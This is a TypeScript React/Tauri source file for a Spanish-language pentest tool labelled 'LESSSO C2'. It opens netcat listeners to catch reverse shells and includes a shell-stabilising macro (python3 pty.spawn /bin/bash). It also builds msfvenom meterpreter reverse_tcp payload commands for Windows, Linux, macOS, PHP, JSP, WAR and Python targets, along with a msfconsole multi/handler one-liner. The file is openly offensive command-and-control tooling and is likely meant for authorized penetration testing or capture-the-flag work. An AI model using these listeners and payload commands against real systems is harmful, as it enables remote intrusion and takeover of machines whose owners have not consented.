import { useState, useEffect, useRef, useCallback } from 'react';
import { invoke } from '@tauri-apps/api/core';
import { listen } from '@tauri-apps/api/event';
import { Terminal } from '@xterm/xterm';
import { FitAddon } from '@xterm/addon-fit';
import '@xterm/xterm/css/xterm.css';

// ==========================================================
// TIPOS
// ==========================================================
interface Listener {
  id: string;
  port: string;
  isActive: boolean;
  payload?: string;
}

interface ListenerToolProps {
  placeholders: {
    LHOST: string;
    LPORT: string;
  };
  injectedPayload?: string | null;
  onInjectionConsumed?: () => void;
  onListenerCreated?: (port: string) => void;
}

// ==========================================================
// PREFIJO DE SESIÓN DE LISTENERS
// ----------------------------------------------------------
// Todos los IDs de listener empiezan por "listener-".
// Esto permite matarlos en bloque sin tocar las terminales
// Bash que el usuario tenga abiertas en TerminalPanel.
// ==========================================================
const LISTENER_SESSION_PREFIX = 'listener-';

// ==========================================================
// SUB-COMPONENTE: instancia de terminal para un listener
// ==========================================================
function ListenerInstance({
  listener,
  onClose,
}: {
  listener: Listener;
  onClose: (id: string) => void;
}) {
  const termRef = useRef<HTMLDivElement>(null);
  const terminalInstance = useRef<Terminal | null>(null);
  const unlistenFuncs = useRef<Array<() => void>>([]);
  const sessionLog = useRef<string[]>([]);

  // ========================================================
  // Inicializar xterm + nc
  // ========================================================
  useEffect(() => {
    let isMounted = true;

    const initTerminal = async () => {
      if (!termRef.current) return;
      termRef.current.innerHTML = '';

      const term = new Terminal({
        theme: {
          background: '#0b1120',
          foreground: '#34d399',
          cursor: '#34d399',
        },
        fontSize: 13,
        fontFamily: 'monospace',
        cursorBlink: true,
        scrollback: 5000,
      });
      const fitAddon = new FitAddon();
      term.loadAddon(fitAddon);
      term.open(termRef.current);
      fitAddon.fit();
      terminalInstance.current = term;

      term.writeln(`\x1b[1;36m[*] LESSSO C2 — Listener en puerto ${listener.port}\x1b[0m`);
      term.writeln(`\x1b[1;33m[*] Esperando conexión...\x1b[0m\r\n`);

      const unlistenOut = await listen<string>(`term-output-${listener.id}`, (e) => {
        if (!isMounted) return;
        sessionLog.current.push(e.payload);
        term.write(e.payload.replace(/\n/g, '\r\n'));
      });

      const unlistenExit = await listen(`term-exit-${listener.id}`, () => {
        if (!isMounted) return;
        term.writeln('\r\n\x1b[1;33m[*] Sesión terminada.\x1b[0m');
      });

      unlistenFuncs.current.push(unlistenOut, unlistenExit);

      term.onData(data => {
        invoke('write_terminal', { sessionId: listener.id, data }).catch(() => {});
      });

      // ======================================================
      // LANZAR NETCAT DIRECTAMENTE (sin `bash -c`)
      // ------------------------------------------------------
      // ¿Por qué NO usamos `bash -c "nc -lvnp PORT"`?
      //
      //   bash -c hace execvp() del último comando para
      //   optimizar. Pero netcat-openbsd llama a setsid() por
      //   su cuenta. Resultado:
      //
      //     PID X = bash     → execvp("nc") → PID X = nc
      //     PID X = nc       → setsid() → PGID = X, SID = X
      //     bash padre (si fork) muere, nc queda huérfano
      //     con PPID=1 (systemd)
      //
      //   El `Child` que Rust captura apunta a un PID muerto,
      //   así que `kill(-pgid, SIGINT)` no alcanza al nc.
      //
      //   Spawneando `nc` directamente, el PID de Rust ES el
      //   PID del nc, y todo funciona:
      //     - Ctrl+C → SIGINT al PGID del nc → muere
      //     - Cerrar pestaña → SIGTERM/SIGKILL → muere
      //     - Cerrar app → kill_sweep → muere
      // ======================================================
      try {
        await invoke('start_terminal', {
          sessionId: listener.id,
          cmd: 'nc',
          args: ['-lvnp', listener.port],
        });
      } catch (err) {
        term.writeln(`\r\n\x1b[1;31m[!] Error del Sistema: ${err}\x1b[0m`);
      }

      const resizeHandler = () => fitAddon.fit();
      window.addEventListener('resize', resizeHandler);
      unlistenFuncs.current.push(() => window.removeEventListener('resize', resizeHandler));
    };

    initTerminal();

    return () => {
      isMounted = false;
      unlistenFuncs.current.forEach(f => f());
      invoke('kill_terminal', { sessionId: listener.id }).catch(() => {});
    };
  }, [listener.id, listener.port]);

  // ========================================================
  // Acciones de terminal
  // ========================================================

  /**
   * Ctrl+C: envía SIGINT + SIGTERM al process group del nc.
   *
   * Algunas builds de nc ignoran SIGINT por diseño (para no
   * cerrarse durante una sesión interactiva). Por eso hacemos
   * un fallback a los 500ms con SIGKILL, que NUNCA se ignora.
   *
   * Resultado: el listener siempre muere y el puerto queda libre.
   */
  const sendCtrlC = async () => {
    // Intento 1: señales amables
    await invoke('send_terminal_signal', {
      sessionId: listener.id,
      signalName: 'SIGINT',
    }).catch(() => {});

    // Intento 2 (fallback): si sigue vivo, SIGKILL
    setTimeout(() => {
      invoke('send_terminal_signal', {
        sessionId: listener.id,
        signalName: 'SIGKILL',
      }).catch(() => {});
    }, 500);
  };

  /**
   * Ctrl+Z: suspende el proceso (no lo mata).
   * Si el nc está en foreground, se irá a background.
   */
  const sendCtrlZ = async () => {
    await invoke('send_terminal_signal', {
      sessionId: listener.id,
      signalName: 'SIGTSTP',
    }).catch(() => {});
  };

  /**
   * Estabilizar TTY: lanza Python PTY en la sesión del atacante
   * cuando ya hay una reverse shell conectada.
   */
  const stabilizeTty = async () => {
    const macro =
      `python3 -c 'import pty;pty.spawn("/bin/bash")'\n` +
      `export TERM=xterm\n` +
      `stty rows 40 columns 100\n`;

    try {
      await invoke('write_terminal', {
        sessionId: listener.id,
        data: macro,
      });
      await invoke('send_terminal_signal', {
        sessionId: listener.id,
        signalName: 'SIGTSTP',
      });
    } catch (err) {
      console.warn('[stabilizeTty] falló:', err);
    }
  };

  return (
    <div className="flex-1 flex-col h-full flex bg-[#0b1120]">
      {/* Barra de controles */}
      <div className="bg-slate-800 border-b border-slate-700 flex justify-between p-1.5 shrink-0 items-center">
        <div className="flex gap-1.5">
          <button
            onClick={sendCtrlC}
            className="bg-red-900/50 hover:bg-red-600 text-red-200 hover:text-white px-2 py-0.5 rounded text-[10px] font-bold shadow-sm transition-colors border border-red-500/30"
            title="Interrumpir listener (SIGINT + SIGKILL fallback)"
          >
            Ctrl+C
          </button>
          <button
            onClick={sendCtrlZ}
            className="bg-orange-900/50 hover:bg-orange-600 text-orange-200 hover:text-white px-2 py-0.5 rounded text-[10px] font-bold shadow-sm transition-colors border border-orange-500/30"
            title="Suspender proceso (SIGTSTP al process group)"
          >
            Ctrl+Z
          </button>
          <button
            onClick={stabilizeTty}
            className="bg-purple-600 hover:bg-purple-500 text-white px-2 py-0.5 rounded text-[10px] font-bold shadow-sm transition-colors"
            title="Estabilizar TTY con Python PTY"
          >
            ✨ Estabilizar TTY
          </button>
        </div>
        <span className="text-[10px] font-bold text-slate-400">
          Puerto {listener.port}
        </span>
        <button
          onClick={() => onClose(listener.id)}
          className="text-[10px] font-bold uppercase text-slate-400 hover:text-red-400 pr-2"
        >
          Cerrar ✕
        </button>
      </div>

      {/* Terminal */}
      <div ref={termRef} className="flex-1 w-full h-full p-2 bg-[#0b1120] overflow-hidden" />
    </div>
  );
}

// ==========================================================
// GENERADOR MSFVENOM
// ==========================================================
const MSF_PLATFORMS = [
  { value: 'windows/x64',  label: 'Windows x64' },
  { value: 'windows/x86',  label: 'Windows x86' },
  { value: 'linux/x64',    label: 'Linux x64' },
  { value: 'linux/x86',    label: 'Linux x86' },
  { value: 'osx/x64',      label: 'macOS x64' },
  { value: 'php',          label: 'PHP' },
  { value: 'java/jsp_shell', label: 'JSP' },
  { value: 'java/war',     label: 'WAR (Tomcat)' },
  { value: 'python',       label: 'Python' },
  { value: 'cmd/unix',     label: 'Bash/Unix' },
];

const MSF_FORMATS: Record<string, { value: string; label: string; ext: string }[]> = {
  'windows/x64': [{ value: 'exe', label: '.exe', ext: '.exe' }, { value: 'dll', label: '.dll', ext: '.dll' }, { value: 'ps1', label: 'PowerShell', ext: '.ps1' }, { value: 'raw', label: 'Shellcode', ext: '.bin' }],
  'windows/x86': [{ value: 'exe', label: '.exe', ext: '.exe' }, { value: 'dll', label: '.dll', ext: '.dll' }, { value: 'ps1', label: 'PowerShell', ext: '.ps1' }, { value: 'raw', label: 'Shellcode', ext: '.bin' }],
  'linux/x64':   [{ value: 'elf', label: '.elf', ext: '.elf' }, { value: 'raw', label: 'Shellcode', ext: '.bin' }],
  'linux/x86':   [{ value: 'elf', label: '.elf', ext: '.elf' }, { value: 'raw', label: 'Shellcode', ext: '.bin' }],
  'osx/x64':     [{ value: 'macho', label: '.macho', ext: '' }, { value: 'raw', label: 'Shellcode', ext: '.bin' }],
  'php':         [{ value: 'raw', label: '.php', ext: '.php' }],
  'java/jsp_shell': [{ value: 'raw', label: '.jsp', ext: '.jsp' }],
  'java/war':    [{ value: 'war', label: '.war', ext: '.war' }],
  'python':      [{ value: 'raw', label: '.py', ext: '.py' }],
  'cmd/unix':    [{ value: 'raw', label: '.sh', ext: '.sh' }],
};

function MsfvenomGenerator({ placeholders }: { placeholders: ListenerToolProps['placeholders'] }) {
  const [platform, setPlatform] = useState('windows/x64');
  const [format, setFormat] = useState('exe');
  const [lhost, setLhost] = useState(placeholders.LHOST);
  const [lport, setLport] = useState(placeholders.LPORT);
  const [outputName, setOutputName] = useState('shell');
  const [copied, setCopied] = useState(false);

  useEffect(() => { setLhost(placeholders.LHOST); }, [placeholders.LHOST]);
  useEffect(() => { setLport(placeholders.LPORT); }, [placeholders.LPORT]);

  useEffect(() => {
    const formats = MSF_FORMATS[platform] || [];
    if (formats.length > 0) setFormat(formats[0].value);
  }, [platform]);

  const currentFormats = MSF_FORMATS[platform] || [];
  const currentExt = currentFormats.find(f => f.value === format)?.ext || '';

  const command = `msfvenom -p ${platform}/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f ${format} -o ${outputName}${currentExt}`;

  const copyCommand = async () => {
    try {
      await navigator.clipboard.writeText(command);
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    } catch {}
  };

  return (
    <div className="flex flex-col h-full overflow-y-auto custom-scrollbar p-3 space-y-3">
      <h3 className="text-[10px] tracking-widest font-black text-purple-600 dark:text-purple-400 uppercase border-b border-slate-200 dark:border-slate-800 pb-1.5">
        💥 MSFVenom Payload Generator
      </h3>

      <div className="flex gap-2">
        <div className="flex-1">
          <label className="text-[8px] font-bold text-slate-500 uppercase block mb-0.5">LHOST</label>
          <input
            type="text"
            value={lhost}
            onChange={e => setLhost(e.target.value)}
            placeholder="10.10.14.5"
            className="w-full px-2 py-1.5 bg-slate-50 dark:bg-slate-900 border border-slate-200 dark:border-slate-700 rounded text-xs font-mono dark:text-white outline-none focus:border-purple-500"
          />
        </div>
        <div className="w-24">
          <label className="text-[8px] font-bold text-slate-500 uppercase block mb-0.5">LPORT</label>
          <input
            type="text"
            value={lport}
            onChange={e => setLport(e.target.value)}
            placeholder="4444"
            className="w-full px-2 py-1.5 bg-slate-50 dark:bg-slate-900 border border-slate-200 dark:border-slate-700 rounded text-xs font-mono dark:text-white outline-none focus:border-purple-500"
          />
        </div>
      </div>

      <div className="grid grid-cols-2 gap-2">
        <div>
          <label className="text-[8px] font-bold text-slate-500 uppercase block mb-0.5">Plataforma</label>
          <select
            value={platform}
            onChange={e => setPlatform(e.target.value)}
            className="w-full px-2 py-1.5 bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 rounded text-[10px] font-bold dark:text-white outline-none"
          >
            {MSF_PLATFORMS.map(p => (
              <option key={p.value} value={p.value}>{p.label}</option>
            ))}
          </select>
        </div>
        <div>
          <label className="text-[8px] font-bold text-slate-500 uppercase block mb-0.5">Formato</label>
          <select
            value={format}
            onChange={e => setFormat(e.target.value)}
            className="w-full px-2 py-1.5 bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 rounded text-[10px] font-bold dark:text-white outline-none"
          >
            {currentFormats.map(f => (
              <option key={f.value} value={f.value}>{f.label}</option>
            ))}
          </select>
        </div>
      </div>

      <div>
        <label className="text-[8px] font-bold text-slate-500 uppercase block mb-0.5">Nombre del archivo</label>
        <input
          type="text"
          value={outputName}
          onChange={e => setOutputName(e.target.value)}
          placeholder="shell"
          className="w-full px-2 py-1.5 bg-slate-50 dark:bg-slate-900 border border-slate-200 dark:border-slate-700 rounded text-xs font-mono dark:text-white outline-none focus:border-purple-500"
        />
      </div>

      <div className="p-2 bg-purple-50 dark:bg-purple-900/10 border border-purple-200 dark:border-purple-900/50 rounded">
        <label className="text-[8px] font-bold text-purple-700 dark:text-purple-400 uppercase block mb-1">Comando generado</label>
        <pre className="text-[9px] font-mono text-purple-900 dark:text-purple-200 whitespace-pre-wrap break-all leading-tight">
          {command}
        </pre>
      </div>

      <button
        onClick={copyCommand}
        className="w-full bg-purple-600 hover:bg-purple-500 text-white px-3 py-2 rounded text-[10px] font-bold uppercase shadow-sm transition-colors"
      >
        {copied ? '✓ Copiado!' : '📋 Copiar Comando'}
      </button>

      <div className="p-2 bg-slate-50 dark:bg-slate-800/50 rounded border border-slate-200 dark:border-slate-700 text-[9px] text-slate-500 dark:text-slate-400 space-y-1">
        <p>💡 <strong>Tip:</strong> Después de generar el payload, inicia el listener con:</p>
        <code className="block text-[9px] font-mono bg-slate-100 dark:bg-slate-900 px-2 py-1 rounded">
          msfconsole -q -x "use multi/handler; set PAYLOAD {platform}/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run"
        </code>
      </div>
    </div>
  );
}

// ==========================================================
// COMPONENTE PRINCIPAL: LISTENER TOOL
// ==========================================================
export function ListenerTool({
  placeholders,
  injectedPayload,
  onInjectionConsumed,
  onListenerCreated,
}: ListenerToolProps) {
  const [tab, setTab] = useState<'listener' | 'msfvenom'>('listener');
  const [listeners, setListeners] = useState<Listener[]>([]);
  const [activeListenerId, setActiveListenerId] = useState<string | null>(null);
  const [newPort, setNewPort] = useState(placeholders.LPORT);

  // Ref espejo para evitar closures stale en closeListener.
  const listenersRef = useRef<Listener[]>([]);
  useEffect(() => {
    listenersRef.current = listeners;
  }, [listeners]);

  // Ref para saber si el componente sigue montado
  const isMountedRef = useRef(true);

  // Deduplicación de inyección de payload.
  const lastInjectionSigRef = useRef<string | null>(null);

  // ========================================================
  // Sync: puerto con el padre
  // ========================================================
  useEffect(() => {
    setNewPort(placeholders.LPORT);
  }, [placeholders.LPORT]);

  // ========================================================
  // CLEANUP AL DESMONTAR
  // ----------------------------------------------------------
  // Solo matamos los listeners que gestiona ESTE componente.
  // El prefijo "listener-" garantiza que no tocamos las Bash
  // del TerminalPanel.
  // ========================================================
  useEffect(() => {
    isMountedRef.current = true;

    const cleanup = () => {
      invoke('kill_all_terminals', { sessionPrefix: LISTENER_SESSION_PREFIX })
        .then((killed) => {
          if (typeof killed === 'number' && killed > 0) {
            console.debug(`[ListenerTool] Cleanup: ${killed} listeners matados`);
          }
        })
        .catch((err) => {
          console.warn('[ListenerTool] Cleanup falló (no crítico):', err);
        });
    };

    const handleBeforeUnload = () => {
      invoke('kill_all_terminals', { sessionPrefix: LISTENER_SESSION_PREFIX }).catch(() => {});
    };

    window.addEventListener('beforeunload', handleBeforeUnload);

    return () => {
      isMountedRef.current = false;
      window.removeEventListener('beforeunload', handleBeforeUnload);
      cleanup();
    };
  }, []);

  // ========================================================
  // Helper: encuentra el siguiente puerto libre
  // ========================================================
  const findFreePort = useCallback((startPort: number, currentListeners: Listener[]): number => {
    const used = new Set(currentListeners.map(l => parseInt(l.port, 10)));
    let candidate = startPort;
    while (used.has(candidate) && candidate < 65535) {
      candidate++;
    }
    return candidate > 65535 ? startPort : candidate;
  }, []);

  // ========================================================
  // Inyección de payload desde el Arsenal
  // ========================================================
  useEffect(() => {
    if (!injectedPayload) return;

    // Deduplicar (StrictMode en dev re-monta el componente).
    if (lastInjectionSigRef.current === injectedPayload) {
      return;
    }
    lastInjectionSigRef.current = injectedPayload;

    setTab('listener');

    const portMatch = injectedPayload.match(/(\d{2,5})/g);
    const suggestedPort = portMatch && portMatch.length > 0
      ? portMatch[portMatch.length - 1]
      : placeholders.LPORT;

    const id = `${LISTENER_SESSION_PREFIX}${Date.now()}`;
    const newListener: Listener = {
      id,
      port: suggestedPort,
      isActive: true,
      payload: injectedPayload,
    };

    setListeners(prev => {
      const portNum = parseInt(suggestedPort, 10);
      const finalPort = prev.some(l => l.port === suggestedPort)
        ? findFreePort(portNum + 1, prev).toString()
        : suggestedPort;

      return [...prev, { ...newListener, port: finalPort }];
    });
    setActiveListenerId(id);
    onListenerCreated?.(suggestedPort);
    onInjectionConsumed?.();
  }, [injectedPayload, placeholders.LPORT, onInjectionConsumed, onListenerCreated, findFreePort]);

  // ========================================================
  // Añadir un nuevo listener
  // ========================================================
  const addListener = useCallback(() => {
    const port = newPort.trim();
    if (!port || !/^\d+$/.test(port)) {
      alert('Introduce un puerto válido (número)');
      return;
    }
    const portNum = parseInt(port, 10);
    if (portNum < 1 || portNum > 65535) {
      alert('Puerto fuera de rango (1-65535)');
      return;
    }
    if (listenersRef.current.some(l => l.port === port)) {
      alert(`Ya hay un listener en el puerto ${port}`);
      return;
    }

    const id = `${LISTENER_SESSION_PREFIX}${Date.now()}`;
    const newListener: Listener = { id, port, isActive: true };

    setListeners(prev => [...prev, newListener]);
    setActiveListenerId(id);

    const nextPort = findFreePort(portNum + 1, [...listenersRef.current, newListener]);
    setNewPort(nextPort.toString());

    onListenerCreated?.(port);
  }, [newPort, onListenerCreated, findFreePort]);

  // ========================================================
  // Cerrar un listener
  // ========================================================
  const closeListener = useCallback(async (id: string) => {
    await invoke('kill_terminal', { sessionId: id }).catch(() => {});

    setListeners(prev => {
      const remaining = prev.filter(l => l.id !== id);

      setActiveListenerId(currentActive => {
        if (currentActive !== id) return currentActive;
        return remaining.length > 0 ? remaining[0].id : null;
      });

      return remaining;
    });
  }, []);

  // ========================================================
  // Render
  // ========================================================
  return (
    <div className="flex flex-col h-full bg-slate-900 rounded-lg overflow-hidden border border-slate-700">
      {/* Tabs principales */}
      <div className="flex border-b border-slate-700 bg-slate-950 shrink-0">
        <button
          onClick={() => setTab('listener')}
          className={`px-4 py-2 text-[10px] font-bold uppercase transition-colors whitespace-nowrap flex items-center gap-2 ${
            tab === 'listener'
              ? 'bg-slate-900 text-emerald-400 border-b-2 border-emerald-500'
              : 'text-slate-500 hover:bg-slate-900 border-b-2 border-transparent'
          }`}
        >
          🎧 Listeners ({listeners.length})
        </button>
        <button
          onClick={() => setTab('msfvenom')}
          className={`px-4 py-2 text-[10px] font-bold uppercase transition-colors whitespace-nowrap flex items-center gap-2 ${
            tab === 'msfvenom'
              ? 'bg-slate-900 text-purple-400 border-b-2 border-purple-500'
              : 'text-slate-500 hover:bg-slate-900 border-b-2 border-transparent'
          }`}
        >
          💥 MSFVenom
        </button>
      </div>

      {/* Modo Listener */}
      {tab === 'listener' && (
        <>
          <div className="bg-slate-800 border-b border-slate-700 p-2 shrink-0 flex gap-2 items-center flex-wrap">
            <span className="text-[10px] font-bold text-slate-300 uppercase">Puerto:</span>
            <input
              type="text"
              value={newPort}
              onChange={e => setNewPort(e.target.value)}
              onKeyDown={e => e.key === 'Enter' && addListener()}
              placeholder="4444"
              className="w-20 px-2 py-1 bg-slate-900 border border-slate-600 rounded text-[10px] font-mono text-white outline-none focus:border-emerald-500"
            />
            <button
              onClick={addListener}
              className="bg-emerald-600 hover:bg-emerald-500 text-white px-3 py-1 rounded text-[10px] font-bold uppercase shadow-sm transition-colors"
            >
              + Iniciar Listener
            </button>

            {listeners.length > 0 && (
              <div className="flex gap-1 ml-auto overflow-x-auto">
                {listeners.map(l => (
                  <button
                    key={l.id}
                    onClick={() => setActiveListenerId(l.id)}
                    className={`px-2 py-1 text-[10px] font-bold rounded whitespace-nowrap ${
                      activeListenerId === l.id
                        ? 'bg-emerald-600 text-white'
                        : 'bg-slate-900 text-slate-400 hover:bg-slate-700'
                    }`}
                  >
                    :{l.port}
                  </button>
                ))}
              </div>
            )}
          </div>

          {listeners.length === 0 ? (
            <div className="flex-1 flex flex-col items-center justify-center text-center p-6">
              <span className="text-5xl mb-4 opacity-40">🎧</span>
              <h3 className="text-sm font-bold text-slate-300 mb-2">Sin listeners activos</h3>
              <p className="text-[11px] text-slate-500 max-w-md mb-4">
                Introduce un puerto arriba y pulsa <strong className="text-emerald-400">+ Iniciar Listener</strong> para empezar a escuchar conexiones entrantes.
              </p>
              <p className="text-[10px] text-slate-600">
                Puedes tener <strong>varios listeners simultáneos</strong> en distintos puertos.
              </p>
            </div>
          ) : (
            <div className="flex-1 flex min-h-0">
              {listeners.map(l => (
                <div
                  key={l.id}
                  className={`flex-1 min-w-0 ${activeListenerId === l.id ? 'flex' : 'hidden'}`}
                >
                  <ListenerInstance listener={l} onClose={closeListener} />
                </div>
              ))}
            </div>
          )}
        </>
      )}

      {/* Modo MSFVenom */}
      {tab === 'msfvenom' && <MsfvenomGenerator placeholders={placeholders} />}
    </div>
  );
}
